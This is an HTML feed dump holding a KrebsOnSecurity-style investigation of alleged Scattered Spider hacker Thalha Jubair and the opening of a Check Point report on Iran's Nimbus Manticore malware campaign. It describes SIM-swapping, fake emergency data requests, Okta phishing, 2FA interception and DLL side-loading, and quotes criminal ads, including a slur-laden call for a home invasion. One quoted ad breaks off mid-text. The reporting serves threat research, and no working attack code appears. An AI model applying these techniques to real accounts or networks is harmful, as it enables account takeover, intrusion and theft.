&lt;p&gt;The leader of LAPSUS$ responded by gleefully posting Asyntax&amp;#8217;s real name, phone number, and other hacker handles into a public chat room on Telegram:&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_59487"&gt;
&lt;div class="wp-caption aligncenter" id="attachment_59487" style="width: 759px;"&gt;&lt;img alt="" class="wp-image-59487" height="207" src="https://krebsonsecurity.com/wp-content/uploads/2022/04/amtraxdox.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-59487"&gt;In March 2022, the leader of the LAPSUS$ data extortion group exposed Thalha Jubair’s name and hacker handles in a public chat room on Telegram.&lt;/p&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span id="more-70968"&gt;&lt;/span&gt;That story about the leaked LAPSUS$ chats also connected Amtrak/Asyntax to several previous hacker identities, including “&lt;strong&gt;Everlynn&lt;/strong&gt;,” who in April 2021 began offering a cybercriminal service that &lt;a href="https://krebsonsecurity.com/2022/03/hackers-gaining-power-of-subpoena-via-fake-emergency-data-requests/" rel="noopener" target="_blank"&gt;sold fraudulent “emergency data requests”&lt;/a&gt; targeting the major social media and email providers.&lt;/p&gt;
&lt;p&gt;In these so-called &amp;#8220;fake EDR&amp;#8221; schemes, the hackers compromise email accounts tied to police departments and government agencies, and then send unauthorized demands for subscriber data (e.g. username, IP/email address), while claiming the information being requested can’t wait for a court order because it relates to an urgent matter of life and death.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_59127" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-59127" height="623" src="https://krebsonsecurity.com/wp-content/uploads/2022/03/infinityrecursion.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-59127"&gt;The roster of the now-defunct &amp;#8220;Infinity Recursion&amp;#8221; hacking team, which sold fake EDRs between 2021 and 2022. The founder &amp;#8220;Everlynn&amp;#8221; has been tied to Jubair. The member listed as “Peter” became the leader of LAPSUS$ who would later post Jubair’s name, phone number and hacker handles into LAPSUS$’s chat channel.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;&lt;span id="more-72208"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;EARTHTOSTAR&lt;/h2&gt;
&lt;p&gt;Prosecutors in New Jersey last week &lt;a href="https://www.justice.gov/opa/pr/united-kingdom-national-charged-connection-multiple-cyber-attacks-including-critical" rel="noopener" target="_blank"&gt;alleged&lt;/a&gt; Jubair was part of a threat group variously known as Scattered Spider, &lt;strong&gt;0ktapus&lt;/strong&gt;, and &lt;strong&gt;UNC3944&lt;/strong&gt;, and that he used the nicknames &lt;strong&gt;EarthtoStar&lt;/strong&gt;, &lt;strong&gt;Brad&lt;/strong&gt;, &lt;strong&gt;Austin&lt;/strong&gt;, and &lt;strong&gt;Austistic&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Beginning in 2022, EarthtoStar co-ran a bustling Telegram channel called &lt;strong&gt;Star Chat&lt;/strong&gt;, which was home to a prolific SIM-swapping group that relentlessly used voice- and SMS-based phishing attacks to steal credentials from employees at the major wireless providers in the U.S. and U.K.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_71644" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-71644" height="307" src="https://krebsonsecurity.com/wp-content/uploads/2025/07/ace-earth2star-starchat.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-71644"&gt;Jubair allegedly used the handle &amp;#8220;Earth2Star,&amp;#8221; a core member of a prolific SIM-swapping group operating in 2022. This ad produced by the group lists various prices for SIM swaps.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The group would then use that access to sell a SIM-swapping service that could redirect a target&amp;#8217;s phone number to a device the attackers controlled, allowing them to intercept the victim&amp;#8217;s phone calls and text messages (including one-time codes). Members of Star Chat targeted multiple wireless carriers with SIM-swapping attacks, but they focused mainly on phishing T-Mobile employees.&lt;/p&gt;
&lt;p&gt;In February 2023, KrebsOnSecurity scrutinized more than seven months of these SIM-swapping solicitations on Star Chat, which almost daily peppered the public channel with &amp;#8220;Tmo up!&amp;#8221; and &amp;#8220;Tmo down!&amp;#8221; notices indicating periods wherein the group claimed to have active access to T-Mobile&amp;#8217;s network.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72238" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-72238" height="848" src="https://krebsonsecurity.com/wp-content/uploads/2025/09/rocketace-tmobile.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72238"&gt;A redacted receipt from Star Chat&amp;#8217;s SIM-swapping service targeting a T-Mobile customer after the group gained access to internal T-Mobile employee tools.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The data showed that Star Chat &amp;#8212; along with two other SIM-swapping groups operating at the same time &amp;#8212; &lt;a href="https://krebsonsecurity.com/2023/02/hackers-claim-they-breached-t-mobile-more-than-100-times-in-2022/" rel="noopener" target="_blank"&gt;collectively broke into T-Mobile over a hundred times in the last seven months of 2022&lt;/a&gt;. However, Star Chat was by far the most prolific of the three, responsible for at least 70 of those incidents.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_62908" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-62908" height="496" src="https://krebsonsecurity.com/wp-content/uploads/2023/02/tmodates.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-62908"&gt;The 104 days in the latter half of 2022 in which different known SIM-swapping groups claimed access to T-Mobile employee tools. Star Chat was responsible for a majority of these incidents. Image: krebsonsecurity.com.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;A review of EarthtoStar&amp;#8217;s messages on Star Chat as indexed by the threat intelligence firm &lt;strong&gt;Flashpoint&lt;/strong&gt; shows this person also sold &amp;#8220;AT&amp;amp;T email resets&amp;#8221; and AT&amp;amp;T call forwarding services for up to $1,200 per line. EarthtoStar explained the purpose of this service in post on Telegram:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;&amp;#8220;Ok people are confused, so you know when u login to chase and it says &amp;#8216;2fa required&amp;#8217; or whatever the fuck, well it gives you two options, SMS or Call. If you press call, and I forward the line to you then who do you think will get said call?&amp;#8221;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;New Jersey prosecutors allege Jubair also was involved in a &lt;a href="https://krebsonsecurity.com/2022/08/how-1-time-passcodes-became-a-corporate-liability/" rel="noopener" target="_blank"&gt;mass SMS phishing campaign during the summer of 2022&lt;/a&gt; that stole single sign-on credentials from employees at hundreds of companies. The text messages asked users to click a link and log in at a phishing page that mimicked their employer’s &lt;strong&gt;Okta&lt;/strong&gt; authentication page, saying recipients needed to review pending changes to their upcoming work schedules.&lt;/p&gt;
&lt;p&gt;The phishing websites used a Telegram instant message bot to forward any submitted credentials in real-time, allowing the attackers to use the phished username, password and one-time code to log in as that employee at the real employer website.&lt;/p&gt;
&lt;p&gt;That weeks-long SMS phishing campaign led to intrusions and data thefts at more than 130 organizations, including &lt;strong&gt;LastPass&lt;/strong&gt;, &lt;strong&gt;DoorDash&lt;/strong&gt;, &lt;strong&gt;Mailchimp&lt;/strong&gt;, &lt;strong&gt;Plex&lt;/strong&gt; and &lt;strong&gt;Signal&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_61104" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-61104" height="441" src="https://krebsonsecurity.com/wp-content/uploads/2022/08/amitaico.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-61104"&gt;A visual depiction of the attacks by the SMS phishing group known as 0ktapus, ScatterSwine, and Scattered Spider. Image: Amitai Cohen twitter.com/amitaico.&lt;/p&gt;&lt;/div&gt;
&lt;h2&gt;DA, COMRADE&lt;/h2&gt;
&lt;p&gt;EarthtoStar&amp;#8217;s group Star Chat specialized in phishing their way into business process outsourcing (BPO) companies that provide customer support for a range of multinational companies, including a number of the world&amp;#8217;s largest telecommunications providers. In May 2022, EarthtoStar posted to the Telegram channel &amp;#8220;Frauwudchat&amp;#8221;:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;&amp;#8220;Hi, I am looking for partners in order to exfiltrate data from large telecommunications companies/call centers/alike, I have major experience in this field, [including] a massive call center which houses 200,000+ employees where I have dumped all user credentials and gained access to the [domain controller] + obtained global administrator I also have experience with REST API&amp;#8217;s and programming. I have extensive experience with VPN, Citrix, cisco anyconnect, social engineering + privilege escalation. If you have any Citrix/Cisco VPN or any other useful things please message me and lets work.&amp;#8221;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;At around the same time in the Summer of 2022, at least two different accounts tied to Star Chat &amp;#8212; &amp;#8220;&lt;strong&gt;RocketAce&lt;/strong&gt;&amp;#8221; and &amp;#8220;&lt;strong&gt;Lopiu&lt;/strong&gt;&amp;#8221; &amp;#8212; introduced the group&amp;#8217;s services to denizens of the Russian-language cybercrime forum &lt;strong&gt;Exploit&lt;/strong&gt;, including:&lt;/p&gt;
&lt;p&gt;-SIM-swapping services targeting Verizon and T-Mobile customers;&lt;br /&gt;
-Dynamic phishing pages targeting customers of single sign-on providers like Okta;&lt;br /&gt;
-Malware development services;&lt;br /&gt;
-The sale of extended validation (EV) code signing certificates.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72222" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-72222" height="414" src="https://krebsonsecurity.com/wp-content/uploads/2025/09/kela-lopiu.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72222"&gt;The user &amp;#8220;Lopiu&amp;#8221; on the Russian cybercrime forum Exploit advertised many of the same unique services offered by EarthtoStar and other Star Chat members. Image source: ke-la.com.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;These two accounts on Exploit created multiple sales threads in which they claimed administrative access to U.S. telecommunications providers and asked other Exploit members for help in monetizing that access. In June 2022, RocketAce, which appears to have been just one of EarthtoStar&amp;#8217;s many aliases, posted to Exploit:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Hello. I have access to a telecommunications company&amp;#8217;s citrix and vpn. I would like someone to help me break out of the system and potentially attack the domain controller so all logins can be extracted we can discuss payment and things leave your telegram in the comments or private message me ! Looking for someone with knowledge in citrix/privilege escalation&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;On Nov. 15, 2022, EarthtoStar posted to their &lt;strong&gt;Star Sanctuary&lt;/strong&gt; Telegram channel that they were hiring malware developers with a minimum of three years of experience and the ability to develop rootkits, backdoors and malware loaders.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Optional: Endorsed by advanced APT Groups (e.g. Conti, Ryuk),&amp;#8221; the ad concluded, referencing two of Russia&amp;#8217;s most rapacious and destructive ransomware affiliate operations. &amp;#8220;Part of a nation-state / ex-3l (3 letter-agency).&amp;#8221;&lt;/p&gt;
&lt;h2&gt;2023-PRESENT DAY&lt;/h2&gt;
&lt;p&gt;The Telegram and Discord chat channels wherein Flowers and Jubair allegedly planned and executed their extortion attacks are part of a loose-knit network known as the &lt;strong&gt;Com&lt;/strong&gt;, an English-speaking cybercrime community consisting mostly of individuals living in the United States, the United Kingdom, Canada and Australia.&lt;/p&gt;
&lt;p&gt;Many of these Com chat servers have hundreds to thousands of members each, and some of the more interesting solicitations on these communities are job offers for in-person assignments and tasks that can be found if one searches for posts titled, “If you live near,” or “IRL job” — short for “in real life” job.&lt;/p&gt;
&lt;p&gt;These &amp;#8220;&lt;a href="https://krebsonsecurity.com/2022/09/violence-as-a-service-brickings-firebombings-shootings-for-hire/" rel="noopener" target="_blank"&gt;violence-as-a-service&lt;/a&gt;&amp;#8221; solicitations typically involve “brickings,” where someone is hired to toss a brick through the window at a specified address. Other IRL jobs for hire include tire-stabbings, molotov cocktail hurlings, drive-by shootings, and even home invasions. The people targeted by these services are typically other criminals within the community, but it&amp;#8217;s not unusual to see Com members asking others for help in harassing or intimidating security researchers and even the very law enforcement officers who are investigating their alleged crimes.&lt;/p&gt;
&lt;p&gt;It remains unclear what precipitated this incident or what followed directly after, but on January 13, 2023, a Star Sanctuary account used by EarthtoStar solicited the home invasion of a sitting U.S. federal prosecutor from New York. That post included a photo of the prosecutor taken from the Justice Department&amp;#8217;s website, along with the message:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;&amp;#8220;Need irl niggas, in home hostage shit no fucking pussies no skinny glock holding 100 pound niggas either&amp;#8221;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Throughout late 2022 and early 2023, EarthtoStar&amp;#8217;s alias &amp;#8220;Brad&amp;#8221; (a.k.a. &amp;#8220;Brad_banned&amp;#8221;) frequently advertised Star Chat&amp;#8217;s malware development services, including custom malicious software designed to hide the attacker&amp;#8217;s presence on a victim machine:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;We can develop KERNEL malware which will achieve persistence for a long time,&lt;br /&gt;
bypass firewalls and have reverse shell access.&lt;/p&gt;
&lt;p&gt;This shit is literally like STAGE 4 CANCER FOR COMPUTERS!!!&lt;/p&gt;
&lt;p&gt;Kernel meaning the highest level of authority on a machine.&lt;br /&gt;

&lt;p&gt;In September 2023 , both MGM Resorts and Caesars Entertainment suffered ransomware attacks at the hands of a Russian ransomware affiliate program known as &lt;strong&gt;ALPHV&lt;/strong&gt; and &lt;strong&gt;BlackCat&lt;/strong&gt;. Caesars &lt;a href="https://www.courtwatch.news/p/how-the-fbi-tracked-down-the-15-million-caesars-casino-ransom" rel="noopener" target="_blank"&gt;reportedly paid a $15 million ransom&lt;/a&gt; in that incident.&lt;/p&gt;
&lt;p&gt;Within hours of MGM publicly acknowledging the 2023 breach, members of Scattered Spider were claiming credit and telling reporters they&amp;#8217;d broken in by social engineering a third-party IT vendor. At a hearing in London last week, U.K. prosecutors told the court Jubair was found in possession of more than $50 million in ill-gotten cryptocurrency, including funds that were linked to the Las Vegas casino hacks.&lt;/p&gt;
&lt;p&gt;The Star Chat channel was finally banned by Telegram on March 9, 2025. But U.S. prosecutors say Jubair and fellow Scattered Spider members continued their hacking, phishing and extortion activities up until September 2025.&lt;/p&gt;
&lt;p&gt;In April 2025, the Com was buzzing about the publication of &amp;#8220;&lt;strong&gt;The Com Cast&lt;/strong&gt;,&amp;#8221; a lengthy screed detailing Jubair&amp;#8217;s alleged cybercriminal activities and nicknames over the years. This account included photos and voice recordings allegedly of Jubair, and asserted that in his early days on the Com Jubair used the nicknames Clark and Miku (these are both aliases used by Everlynn in connection with their fake EDR services).&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72224" style="width: 667px;"&gt;&lt;img alt="" class="size-full wp-image-72224" height="507" src="https://krebsonsecurity.com/wp-content/uploads/2025/09/comcast-jubair.png" width="657" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72224"&gt;Thalha Jubair (right), without his large-rimmed glasses, in an undated photo posted in The Com Cast.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;More recently, the anonymous Com Cast author(s) claimed, Jubair had used the nickname &amp;#8220;Operator,&amp;#8221; which corresponds to a Com member who ran an automated Telegram-based doxing service that pulled consumer records from hacked data broker accounts. That public outing came after Operator allegedly seized control over the &lt;strong&gt;Doxbin&lt;/strong&gt;, a long-running and highly toxic community that is used to &amp;#8220;dox&amp;#8221; or post deeply personal information on people.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Operator/Clark/Miku: A key member of the ransomware group Scattered Spider, which consists of a diverse mix of individuals involved in SIM swapping and phishing,&amp;#8221; the Com Cast account stated. &amp;#8220;The group is an amalgamation of several key organizations, including Infinity Recursion (owned by Operator), True Alcorians (owned by earth2star), and Lapsus, which have come together to form a single collective.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The New Jersey &lt;a href="https://s3.documentcloud.org/documents/26103409/thalhajubaircomplaint.pdf" rel="noopener" target="_blank"&gt;complaint&lt;/a&gt; (PDF) alleges Jubair and other Scattered Spider members committed computer fraud, wire fraud, and money laundering in relation to at least 120 computer network intrusions involving 47 U.S. entities between May 2022 and September 2025. The complaint alleges the group&amp;#8217;s victims paid at least $115 million in ransom payments.&lt;/p&gt;
&lt;p&gt;U.S. authorities say they traced some of those payments to Scattered Spider to an Internet server controlled by Jubair. The complaint states that a cryptocurrency wallet discovered on that server was used to purchase several gift cards, one of which was used at a food delivery company to send food to his apartment. Another gift card purchased with cryptocurrency from the same server was allegedly used to fund online gaming accounts under Jubair&amp;#8217;s name. U.S. prosecutors said that when they seized that server they also seized $36 million in cryptocurrency.&lt;/p&gt;
&lt;p&gt;The complaint also charges Jubair with involvement in a hacking incident in January 2025 against the U.S. courts system that targeted a U.S. magistrate judge overseeing a related Scattered Spider investigation. That other investigation appears to have been the prosecution of &lt;strong&gt;Noah Michael Urban&lt;/strong&gt;, a 20-year-old Florida man &lt;a href="https://krebsonsecurity.com/2024/11/feds-charge-five-men-in-scattered-spider-roundup/" rel="noopener" target="_blank"&gt;charged in November 2024 by prosecutors in Los Angeles&lt;/a&gt; as one of five alleged Scattered Spider members.&lt;/p&gt;
&lt;p&gt;Urban pleaded guilty in April 2025 to wire fraud and conspiracy charges, and in August he was sentenced to 10 years in federal prison. Speaking with KrebsOnSecurity from jail after his sentencing, Urban asserted that the judge gave him more time than prosecutors requested because &lt;a href="https://krebsonsecurity.com/2025/08/sim-swapper-scattered-spider-hacker-gets-10-years/" rel="noopener" target="_blank"&gt;he was mad that Scattered Spider hacked his email account&lt;/a&gt;.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_71970" style="width: 611px;"&gt;&lt;img alt="" class="size-full wp-image-71970" height="485" src="https://krebsonsecurity.com/wp-content/uploads/2025/08/kingbobtweets.png" width="601" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-71970"&gt;Noah &amp;#8220;Kingbob&amp;#8221; Urban, posting to Twitter/X around the time of his sentencing on Aug. 20.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;A &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/08/urban-status-hack.pdf" rel="noopener" target="_blank"&gt;court transcript&lt;/a&gt; (PDF) from a status hearing in February 2025 shows Urban was telling the truth about the hacking incident that happened while he was in federal custody. The judge told attorneys for both sides that a co-defendant in the California case was trying to find out about Mr. Urban’s activity in the Florida case, and that the hacker accessed the account by impersonating a judge over the phone and requesting a password reset.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Allison Nixon&lt;/strong&gt; is chief research officer at the New York based security firm &lt;strong&gt;Unit 221B&lt;/strong&gt;, and easily one of the world&amp;#8217;s leading experts on Com-based cybercrime activity. Nixon said the core problem with legally prosecuting well-known cybercriminals from the Com has traditionally been that the top offenders tend to be under the age of 18, and thus difficult to charge under federal hacking statutes.&lt;/p&gt;
&lt;p&gt;In the United States, prosecutors typically wait until an underage cybercrime suspect becomes an adult to charge them. But until that day comes, she said, Com actors often feel emboldened to continue committing &amp;#8212; and very often bragging about &amp;#8212; serious cybercrime offenses.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Here we have a special category of Com offenders that effectively enjoy legal immunity,&amp;#8221; Nixon told KrebsOnSecurity. &amp;#8220;Most get recruited to Com groups when they are older, but of those that join very young, such as 12 or 13, they seem to be the most dangerous because at that age they have no grounding in reality and so much longevity before they exit their legal immunity.”&lt;/p&gt;
&lt;p&gt;Nixon said U.K. authorities face the same challenge when they briefly detain and search the homes of underage Com suspects: Namely, the teen suspects simply go right back to their respective cliques in the Com and start robbing and hurting people again the minute they&amp;#8217;re released.&lt;/p&gt;
&lt;p&gt;Indeed, the U.K. court heard from prosecutors last week that both Scattered Spider suspects were detained and/or searched by local law enforcement on multiple occasions, only to return to the Com less than 24 hours after being released each time.&lt;/p&gt;
&lt;p&gt;&amp;#8220;What we see is these young Com members become vectors for perpetrators to commit enormously harmful acts and even child abuse,&amp;#8221; Nixon said. &amp;#8220;The members of this special category of people who enjoy legal immunity are meeting up with foreign nationals and conducting these sometimes heinous acts at their behest.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Nixon said many of these individuals have few friends in real life because they spend virtually all of their waking hours on Com channels, and so their entire sense of identity, community and self-worth gets wrapped up in their involvement with these online gangs. She said if the law was such that prosecutors could treat these people commensurate with the amount of harm they cause society, that would probably clear up a lot of this problem.&lt;/p&gt;
&lt;p&gt;&amp;#8220;If law enforcement was allowed to keep them in jail, they would quit reoffending,&amp;#8221; she said.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The Times of London&lt;/em&gt; &lt;a href="https://www.thetimes.com/uk/technology-uk/article/teenagers-charged-tfl-cyberattack-scattered-spider-trdhs5rwf" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; that Flowers is facing three charges under the Computer Misuse Act: two of conspiracy to commit an unauthorized act in relation to a computer causing/creating risk of serious damage to human welfare/national security and one of attempting to commit the same act. Maximum sentences for these offenses can range from 14 years to life in prison, depending on the impact of the crime.&lt;/p&gt;
&lt;p&gt;Jubair is reportedly facing two charges in the U.K.: One of conspiracy to commit an unauthorized act in relation to a computer causing/creating risk of serious damage to human welfare/national security and one of failing to comply with a section 49 notice to disclose the key to protected information.&lt;/p&gt;
&lt;p&gt;In the United States, Jubair is charged with computer fraud conspiracy, two counts of computer fraud, wire fraud conspiracy, two counts of wire fraud, and money laundering conspiracy. If extradited to the U.S., tried and convicted on all charges, he faces a maximum penalty of 95 years in prison.&lt;/p&gt;
&lt;p&gt;In July 2025, the United Kingdom barred victims of hacking from paying ransoms to cybercriminal groups unless approved by officials. U.K. organizations that are considered part of critical infrastructure &lt;a href="https://www.thetimes.com/uk/technology-uk/article/ransoms-hackers-cyber-crime-t5kjldwwm" rel="noopener" target="_blank"&gt;reportedly&lt;/a&gt; will face a complete ban, as will the entire public sector. U.K. victims of a hack are now required to notify officials to better inform policymakers on the scale of Britain&amp;#8217;s ransomware problem.&lt;/p&gt;

Known as&amp;#160;UNC1549 or Smoke&amp;#160;Sandstorm,&amp;#160;Nimbus Manticore is a mature Iran-nexus APT group that primarily targets aerospace and defense organizations in the Middle East and Europe. Some of its operations were also previously [&amp;#8230;]&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/"&gt;Nimbus Manticore Deploys New Malware Targeting Europe&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading" id="nimbus-manticore-deploys-new-malware-targeting-europe"&gt;&lt;strong&gt;Nimbus Manticore Deploys New Malware Targeting Europe&lt;/strong&gt;&lt;/h2&gt;



&lt;h2 class="wp-block-heading" id="key-findings"&gt;Key Findings&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Check Point Research is tracking a long‑running campaign by the Iranian threat actor&amp;nbsp;&lt;strong&gt;Nimbus Manticore&lt;/strong&gt;, which overlaps with UNC1549, Smoke Sandstorm, and the “Iranian Dream Job” operations. The ongoing campaign targets defense manufacturing, telecommunications, and aviation that are aligned with IRGC strategic priorities.&lt;/li&gt;



&lt;li&gt;Nimbus Manticore’s recent activity indicates a heightened focus on&amp;nbsp;&lt;strong&gt;Western Europ&lt;/strong&gt;e, specifically Denmark, Sweden, and Portugal. The threat actor impersonates local and global aerospace, defense manufacturing, and telecommunications organizations.&lt;/li&gt;



&lt;li&gt;The threat actor uses tailored spear‑phishing from alleged HR recruters directing victims to fake career portals. Each target receives a unique URL and credentials, enabling tracking and controlled access of each victim. This approach demonstrates strong OPSEC and credible pretexting.&lt;/li&gt;



&lt;li&gt;The attacker uses previously undocumented low-level APIs to establish a multi-stage DLL side-loading chain. This causes a legitimate process to sideload a malicious DLL from a different location and override the normal DLL search order.&lt;/li&gt;



&lt;li&gt;The Nimbus Manticore toolset includes the&amp;nbsp;&lt;strong&gt;MiniJunk&lt;/strong&gt;&amp;nbsp;backdoor and the&amp;nbsp;&lt;strong&gt;MiniBrowse&lt;/strong&gt;&amp;nbsp;stealer. The tools continuously evolve to remain covert, leveraging valid digital signatures, inflate binary sizes, and use multi-stage sideloading and heavy, compiler‑level obfuscation that renders samples be “irreversible” for regular advanced static analysis.&lt;/li&gt;



&lt;li&gt;Overall, the campaign reflects a mature, well‑resourced actor prioritizing stealth, resiliency, and operational security across delivery, infrastructure, and payload layers, an approach consistent with nation‑state tradecraft.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;Since early 2025, Check Point Research (CPR) has tracked waves of Nimbus Manticore activity. Known as&amp;nbsp;&lt;strong&gt;UNC1549 or Smoke&lt;/strong&gt;&amp;nbsp;&lt;strong&gt;Sandstorm,&lt;/strong&gt;&amp;nbsp;Nimbus Manticore is a mature Iran-nexus APT group that primarily targets aerospace and defense organizations in the Middle East and Europe. Some of its operations were also previously described as the&amp;nbsp;&lt;em&gt;&lt;a href="https://www.clearskysec.com/irdreamjob24/"&gt;Iranian DreamJob&lt;/a&gt;&lt;/em&gt;&amp;nbsp;campaign.&lt;/p&gt;



&lt;p&gt;Nimbus Manticore’s activity is characterized by highly targeted phishing campaigns leading to the deployment of custom implants, including&amp;nbsp;&lt;em&gt;Minibike&lt;/em&gt;. First&amp;nbsp;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east/"&gt;reported&lt;/a&gt;&amp;nbsp;by Mandiant in&amp;nbsp;&lt;strong&gt;June 2022&lt;/strong&gt;,&amp;nbsp;&lt;em&gt;Minibike&lt;/em&gt;,&amp;nbsp;also known as&amp;nbsp;&lt;em&gt;SlugResin&lt;/em&gt;, has evolved steadily since its creation. Sample analysis over the years shows its progress, including the addition of obfuscation techniques to evade detection and static analysis, a modular architecture, and the introduction of redundant command-and-control (C2) servers.&lt;/p&gt;



&lt;p&gt;The most recent&amp;nbsp;&lt;em&gt;Minibike&lt;/em&gt;&amp;nbsp;variants suggest a significant increase in the actor’s abilities, including using a novel (and previously undocumented) technique to load DLLs from alternate paths by modifying process execution parameters. This variant has new TTPs such as size inflation, junk code, obfuscation, and code signing to lower detection rates.&lt;/p&gt;



&lt;p&gt;In this article, we highlight the evolution of&amp;nbsp;&lt;em&gt;Minibike&lt;/em&gt;&amp;nbsp;into a new variant dubbed&amp;nbsp;&lt;strong&gt;MiniJunk&lt;/strong&gt;. We also examine a distinct cluster within the Nimbus Manticore umbrella that targets different sectors and employs unique domain naming conventions, while continuing to use similar spear-phishing techniques and share malware resources.&lt;/p&gt;



&lt;p&gt;While we were finalizing this publication, PRODAFT has released a comprehensive &lt;a href="https://catalyst.prodaft.com/public/report/modus-operandi-of-subtle-snail"&gt;report&lt;/a&gt; on Subtle Snail, an espionage group with connections to Iran. In this publication, we address Subtle Snail in the chapter entitled &amp;#8216;Separate Cluster of Activity”. While this cluster employs tactics, techniques, and procedures (TTPs) that broadly align with those observed in Nimbus Manticore operations, it is differentiated by its unique malware capabilities, command-and-control (C2) infrastructure, and targeting preferences.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="malware-delivery-websites"&gt;Malware Delivery websites&lt;/h2&gt;



&lt;p&gt;The attack starts with a phishing link that directs the victim to a fake job-related login page:&lt;/p&gt;



&lt;figure class="wp-block-image"&gt;&lt;img alt="Figure 1 - Websites used to deliver malicious archives after
successful login." src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image1.png" /&gt;&lt;/figure&gt;



&lt;p class="has-text-align-center"&gt;Figure 1 &amp;#8211; Websites used to deliver malicious archives after successful login.&lt;/p&gt;



&lt;p&gt;The infrastructure used by the attacker to lure job seekers is based on the React template, which varies depending on the impersonated brand, such as Boeing, Airbus, Rheinmetall and flydubai.&lt;/p&gt;



&lt;p&gt;The domain naming convention is usually&amp;nbsp;&lt;strong&gt;“career” themed&lt;/strong&gt;&amp;nbsp;and registered behind&amp;nbsp;&lt;strong&gt;Cloudflare&lt;/strong&gt;, most likely to keep the real server IP confidential.&lt;/p&gt;



&lt;p&gt;The credentials for these login panels are pre-shared with the victim together with a link to the login page. After entering credentials and clicking the login button, a post request is sent to&amp;nbsp;&lt;code&gt;/login-user&lt;/code&gt;&amp;nbsp;api. If the credentials are not correct, a&amp;nbsp;&lt;code&gt;401 Unauthorized&lt;/code&gt;&amp;nbsp;response is returned. Otherwise, the user downloads a malicious archive with the malware.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="infection-chain"&gt;Infection Chain&lt;/h2&gt;



&lt;p&gt;A malicious archive downloaded by the victim often masquerades as legitimate hiring process-related software. In the following example, a ZIP archive named&amp;nbsp;&lt;code&gt;Survey.zip&lt;/code&gt;&amp;nbsp;starts an elaborated infection chain. The execution chain leverages a unique technique which we call&amp;nbsp;&lt;strong&gt;multi-stage sideloading&lt;/strong&gt;:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 2 - The infection chain.&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;The infection chain includes the following stages:" src="https://research.checkpoint.com/wp-content/uploads/2025/09/65KBU9LU18-image2.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 &amp;#8211; The infection chain.The infection chain includes the following stages:&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;User Execution:&lt;/strong&gt;&amp;nbsp;The victim runs&amp;nbsp;&lt;code&gt;Setup.exe&lt;/code&gt;&amp;nbsp;from the archive. This is a legitimate Windows executable, which sideloads&amp;nbsp;&lt;code&gt;userenv.dll&lt;/code&gt;&amp;nbsp;from the same archive.&lt;/li&gt;



